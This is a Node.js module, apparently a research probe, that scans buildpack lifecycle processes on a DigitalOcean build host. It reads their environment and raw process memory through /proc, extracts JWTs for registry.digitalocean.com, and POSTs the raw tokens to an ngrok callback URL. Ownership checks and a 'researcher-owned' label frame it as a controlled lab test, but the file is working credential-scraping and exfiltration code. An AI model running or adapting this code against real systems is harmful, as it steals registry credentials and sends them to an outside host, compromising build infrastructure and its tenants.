import crypto from 'node:crypto';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';

const DEFAULT_MAX_TOTAL_BYTES = 48 * 1024 * 1024;
const DEFAULT_MAX_REGION_BYTES = 12 * 1024 * 1024;
const CHUNK_BYTES = 128 * 1024;
const OVERLAP_BYTES = 16 * 1024;
const MAX_CANDIDATES = 8;
const OWNED_REPOSITORY_PREFIX = 'apps-nyc3-f5a2cd24-f492-4c05-a90b-347105a47fc0/';
const LIFECYCLE_PROCESS_NAMES = new Set([
  'lifecycle',
  'analyzer',
  'detector',
  'restorer',
  'extender',
  'builder',
  'exporter',
  'creator',
  'outprefixer',
]);
const SENSITIVE_ENVIRONMENT_NAME = /(?:CNB_REGISTRY_AUTH|REGISTRY|DOCKER|OCI|TOKEN|SECRET|AUTH|CREDENTIAL|PASSWORD|PASSWD|PRIVATE|ACCESS_KEY|API_KEY)/i;
const JWT_PATTERN = /eyJ[A-Za-z0-9_-]{8,}[.]eyJ[A-Za-z0-9_-]{8,}[.][A-Za-z0-9_-]{8,}/g;
const sha256 = (value) => crypto.createHash('sha256').update(value ?? '').digest('hex');

const sanitizeCommandLine = (pid) => {
  try {
    const args = fs.readFileSync(`/proc/${pid}/cmdline`).toString('utf8').split('\0').filter(Boolean);
    return {
      readable: true,
      argumentCount: args.length,
      executableBasename: args[0] ? path.basename(args[0]) : null,
      optionNames: [...new Set(args.slice(1).filter((value) => value.startsWith('-'))
        .map((value) => value.split('=', 1)[0].slice(0, 80)))].sort(),
      nonOptionArguments: args.slice(1).filter((value) => !value.startsWith('-')).map((value) => ({
        valueLength: value.length,
        valueSha256: sha256(value),
        pathLike: value.startsWith('/'),
      })),
      rawArgumentsIncluded: false,
    };
  } catch (error) {
    return { readable: false, error: error.code || error.name, rawArgumentsIncluded: false };
  }
};

const lifecycleRuntimeMetadata = () => {
  const metadata = {
    node: process.version,
    libraries: Object.fromEntries(Object.entries(process.versions).sort(([left], [right]) => left.localeCompare(right))),
    osRelease: null,
    lifecycleBinaries: [],
    rawVersionOutputIncluded: false,
  };
  try {
    const release = Object.fromEntries(fs.readFileSync('/etc/os-release', 'utf8').split('\n').filter(Boolean).map((line) => {
      const index = line.indexOf('=');
      const value = index < 0 ? '' : line.slice(index + 1).replace(/^"|"$/g, '');
      return [line.slice(0, index), value];
    }));
    metadata.osRelease = { id: release.ID || null, versionId: release.VERSION_ID || null };
  } catch {
    // The build image may not expose os-release.
  }
  for (const candidate of ['/cnb/lifecycle/lifecycle', '/cnb/lifecycle/builder']) {
    try {
      const stat = fs.statSync(candidate);
      if (!stat.isFile() || stat.size > 64 * 1024 * 1024) continue;
      const result = spawnSync(candidate, ['-version'], {
        cwd: '/tmp',
        env: { LANG: 'C', PATH: '/usr/local/bin:/usr/bin:/bin' },
        encoding: 'utf8',
        timeout: 2_000,
        maxBuffer: 32 * 1024,
      });
      const versionOutput = `${result.stdout || ''}${result.stderr || ''}`;
      metadata.lifecycleBinaries.push({
        basename: path.basename(candidate),
        bytes: stat.size,
        sha256: sha256(fs.readFileSync(candidate)),
        versionProbeExitStatus: Number.isInteger(result.status) ? result.status : null,
        versionProbeSignal: result.signal || null,
        versionOutputBytes: Buffer.byteLength(versionOutput),
        versionOutputSha256: sha256(versionOutput),
        semanticVersions: [...new Set(versionOutput.match(/\bv?\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)?\b/g) || [])].slice(0, 8),
      });
    } catch (error) {
      metadata.lifecycleBinaries.push({ basename: path.basename(candidate), available: false, error: error.code || error.name });
    }
  }
  return metadata;
};

const decodeJson = (segment) => {
  try { return JSON.parse(Buffer.from(segment, 'base64url').toString('utf8')); } catch { return null; }
};

const summarizeRegistryJwt = (token) => {
  const segments = token.split('.');
  if (segments.length !== 3) return null;
  const header = decodeJson(segments[0]);
  const claims = decodeJson(segments[1]);
  if (!header || !claims) return null;
  const issuer = typeof claims.iss === 'string' ? claims.iss : '';
  const audiences = Array.isArray(claims.aud) ? claims.aud : typeof claims.aud === 'string' ? [claims.aud] : [];
  const access = Array.isArray(claims.access) ? claims.access : [];
  const resources = access.map((entry) => ({
    type: typeof entry?.type === 'string' ? entry.type : null,
    nameSha256: typeof entry?.name === 'string' ? sha256(entry.name) : null,
    ownedRepository: typeof entry?.name === 'string' && entry.name.startsWith(OWNED_REPOSITORY_PREFIX),
    actions: Array.isArray(entry?.actions) ? [...entry.actions].filter((value) => typeof value === 'string').sort() : [],
  }));
  const registryAudience = audiences.includes('registry.digitalocean.com');
  const registryIssuer = issuer.includes('docrauth.digitalocean.com');
  if (!registryAudience && !registryIssuer && resources.length === 0) return null;
  return {
    tokenLength: token.length,
    tokenSha256: sha256(token),
    headerKeys: Object.keys(header).sort(),
    claimKeys: Object.keys(claims).sort(),
    algorithm: typeof header.alg === 'string' ? header.alg : null,
    issuerSha256: issuer ? sha256(issuer) : null,
    registryIssuer,
    audienceHashes: audiences.map(sha256).sort(),
    registryAudience,
    issuedAt: Number.isFinite(claims.iat) ? claims.iat : null,
    expiresAt: Number.isFinite(claims.exp) ? claims.exp : null,
    ttlSeconds: Number.isFinite(claims.iat) && Number.isFinite(claims.exp) ? claims.exp - claims.iat : null,
    resources,
    allResourcesOwned: resources.length > 0 && resources.every((entry) => entry.ownedRepository),
  };
};

const parseMaps = (content) => content.split('\n').filter(Boolean).map((line) => {
  const match = line.match(/^([0-9a-f]+)-([0-9a-f]+)\s+([rwxps-]{4})\s+[0-9a-f]+\s+\S+\s+\d+\s*(.*)$/i);
  if (!match) return null;
  return {
    start: Number.parseInt(match[1], 16),
    end: Number.parseInt(match[2], 16),
    permissions: match[3],
    pathname: match[4] || '',
  };
}).filter(Boolean);

const candidateProcesses = () => fs.readdirSync('/proc').filter((entry) => /^\d+$/.test(entry)).map((pid) => {
  try {
    const comm = fs.readFileSync(`/proc/${pid}/comm`, 'utf8').trim();
    const exe = path.basename(fs.readlinkSync(`/proc/${pid}/exe`));
    const status = fs.readFileSync(`/proc/${pid}/status`, 'utf8');
    const uid = Number(status.match(/^Uid:\s+(\d+)/m)?.[1]);
    return { pid: Number(pid), comm, exe, uid, commandLine: sanitizeCommandLine(pid) };
  } catch {
    return null;
  }
}).filter((entry) => entry && entry.uid === process.getuid()
  && entry.pid !== process.pid
  && (LIFECYCLE_PROCESS_NAMES.has(entry.comm) || LIFECYCLE_PROCESS_NAMES.has(entry.exe)));

const sendPrivateCandidate = async (token, summary) => {
  const callbackBase = process.env.LAB_LIFECYCLE_TOKEN_CALLBACK_URL || '';
  const callbackSecret = process.env.LAB_LIFECYCLE_TOKEN_CALLBACK_SECRET || '';
  const result = { configured: Boolean(callbackBase && callbackSecret), attempted: false, accepted: false, status: null, error: null };
  if (!result.configured || !summary.allResourcesOwned || (!summary.registryAudience && !summary.registryIssuer)) return result;
  try {
    const url = new URL(callbackBase);
    if (url.protocol !== 'https:' || !url.hostname.endsWith('.ngrok-free.app')) throw new Error('callback-not-allowlisted');
    url.pathname = '/digitalocean-build-token';
    url.search = '';
    url.hash = '';
    result.attempted = true;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-lab-secret': callbackSecret },
      body: JSON.stringify({
        schema: 1,
        capturedAt: new Date().toISOString(),
        probe: 'owned-buildpack-lifecycle-memory',
        registry: 'registry.digitalocean.com',
        token,
        resources: summary.resources.map((entry) => ({
          nameSha256: entry.nameSha256,
          actions: entry.actions,
          ownedRepository: entry.ownedRepository,
        })),
      }),
      redirect: 'manual',
      signal: AbortSignal.timeout(5000),
    });
    result.status = response.status;
    result.accepted = response.status >= 200 && response.status < 300;
  } catch (error) {
    result.error = error.name === 'TimeoutError' ? 'timeout' : String(error.message || error.code || error.name);
  }
  return result;
};

export async function scanLifecycleMemory(options = {}) {
  const maxTotalBytes = Number.isFinite(options.maxTotalBytes)
    ? Math.max(0, Math.min(options.maxTotalBytes, 64 * 1024 * 1024))
    : DEFAULT_MAX_TOTAL_BYTES;
  const maxRegionBytes = Number.isFinite(options.maxRegionBytes)
    ? Math.max(0, Math.min(options.maxRegionBytes, 16 * 1024 * 1024))
    : DEFAULT_MAX_REGION_BYTES;
  const enableCallback = options.enableCallback !== false;
  const includeRuntimeMetadata = options.includeRuntimeMetadata !== false;
  const callbackHashes = options.callbackHashes instanceof Set ? options.callbackHashes : new Set();
  const targets = candidateProcesses();
  const candidates = new Map();
  const processes = [];
  let totalBytesRead = 0;
  let totalEnvironmentBytesRead = 0;
  let registryHostOccurrences = 0;
  const recordTokens = (value, sourcePid, sourceKind) => {
    const matches = String(value).match(JWT_PATTERN) || [];
    for (const token of matches) {
      const summary = summarizeRegistryJwt(token);
      if (summary && !candidates.has(summary.tokenSha256)) candidates.set(summary.tokenSha256, {
        token,
        summary,
        sourcePid,
        sourceKind,
      });
      if (candidates.size >= MAX_CANDIDATES) break;
    }
  };

  for (const target of targets) {
    const processResult = {
      pid: target.pid,
      comm: target.comm,
      executableBasename: target.exe,
      uid: target.uid,
      commandLine: target.commandLine,
      environmentReadable: false,
      environmentBytes: 0,
      environmentKeyCount: 0,
      interestingEnvironment: [],
      mapsReadable: false,
      memoryReadable: false,
      candidateRegions: 0,
      regionsRead: 0,
      bytesRead: 0,
      readErrors: 0,
    };
    try {
      const environmentBuffer = fs.readFileSync(`/proc/${target.pid}/environ`);
      processResult.environmentReadable = true;
      processResult.environmentBytes = environmentBuffer.length;
      totalEnvironmentBytesRead += environmentBuffer.length;
      const environment = environmentBuffer.toString('utf8').split('\0').filter(Boolean).map((entry) => {
        const index = entry.indexOf('=');
        return index < 0 ? [entry, ''] : [entry.slice(0, index), entry.slice(index + 1)];
      });
      processResult.environmentKeyCount = environment.length;
      for (const [key, value] of environment) {
        const tokenShaped = JWT_PATTERN.test(value);
        JWT_PATTERN.lastIndex = 0;
        if (SENSITIVE_ENVIRONMENT_NAME.test(key) || tokenShaped) {
          processResult.interestingEnvironment.push({
            key,
            valueLength: value.length,
            valueSha256: sha256(value),
            registryJwtShapePresent: tokenShaped,
          });
        }
        registryHostOccurrences += (value.match(/(?:registry[.]digitalocean[.]com|docrauth[.]digitalocean[.]com|apps-[a-z0-9-]+[.]docr[.]space)/g) || []).length;
        recordTokens(value, target.pid, 'environment');
      }
      processResult.interestingEnvironment.sort((left, right) => left.key.localeCompare(right.key));
    } catch (error) {
      processResult.environmentError = error.code || error.name;
    }
    let maps;
    try {
      maps = parseMaps(fs.readFileSync(`/proc/${target.pid}/maps`, 'utf8'));
      processResult.mapsReadable = true;
    } catch (error) {
      processResult.mapsError = error.code || error.name;
      processes.push(processResult);
      continue;
    }
    const regions = maps.filter((entry) => entry.permissions.startsWith('rw')
      && (entry.pathname === '' || entry.pathname.startsWith('['))
      && entry.end > entry.start);
    processResult.candidateRegions = regions.length;
    let memory;
    try {
      memory = fs.openSync(`/proc/${target.pid}/mem`, 'r');
      processResult.memoryReadable = true;
    } catch (error) {
      processResult.memoryError = error.code || error.name;
      processes.push(processResult);
      continue;
    }
    try {
      for (const region of regions) {
        if (totalBytesRead >= maxTotalBytes || candidates.size >= MAX_CANDIDATES) break;
        const regionBytes = Math.min(region.end - region.start, maxRegionBytes, maxTotalBytes - totalBytesRead);
        let offset = 0;
        let carry = Buffer.alloc(0);
        let readAny = false;
        while (offset < regionBytes && totalBytesRead < maxTotalBytes && candidates.size < MAX_CANDIDATES) {
          const buffer = Buffer.allocUnsafe(Math.min(CHUNK_BYTES, regionBytes - offset));
          let bytesRead;
          try {
            bytesRead = fs.readSync(memory, buffer, 0, buffer.length, region.start + offset);
          } catch {
            processResult.readErrors += 1;
            break;
          }
          if (bytesRead <= 0) break;
          readAny = true;
          processResult.bytesRead += bytesRead;
          totalBytesRead += bytesRead;
          const window = Buffer.concat([carry, buffer.subarray(0, bytesRead)]).toString('latin1');
          registryHostOccurrences += (window.match(/(?:registry[.]digitalocean[.]com|docrauth[.]digitalocean[.]com|apps-[a-z0-9-]+[.]docr[.]space)/g) || []).length;
          recordTokens(window, target.pid, 'memory');
          carry = buffer.subarray(Math.max(0, bytesRead - OVERLAP_BYTES), bytesRead);
          offset += bytesRead;
        }
        if (readAny) processResult.regionsRead += 1;
      }
    } finally {
      fs.closeSync(memory);
    }
    processes.push(processResult);
  }

  const sanitizedCandidates = [];
  for (const { token, summary, sourcePid, sourceKind } of candidates.values()) {
    const shouldCallback = enableCallback && !callbackHashes.has(summary.tokenSha256);
    const callback = shouldCallback ? await sendPrivateCandidate(token, summary)
      : { configured: false, attempted: false, accepted: false, status: null, error: shouldCallback ? null : 'disabled-or-duplicate' };
    if (callback.attempted) callbackHashes.add(summary.tokenSha256);
    sanitizedCandidates.push({ sourcePid, sourceKind, ...summary, callback });
  }
  return {
    schema: 1,
    classification: 'SANITIZED_RESEARCHER_OWNED_CONTROL',
    safety: {
      maxTotalBytes,
      maxRegionBytes,
      onlySameUidLifecycleProcesses: true,
      onlyReadableAnonymousWritableMappings: true,
      rawMemoryPersisted: false,
      rawEnvironmentPersisted: false,
      rawCredentialLogged: false,
    },
    runtime: includeRuntimeMetadata ? lifecycleRuntimeMetadata() : null,
    targetCount: targets.length,
    processes,
    totalBytesRead,
    totalEnvironmentBytesRead,
    registryHostOccurrences,
    registryCredentialCandidateCount: sanitizedCandidates.length,
    registryCredentialCandidates: sanitizedCandidates,
  };
}
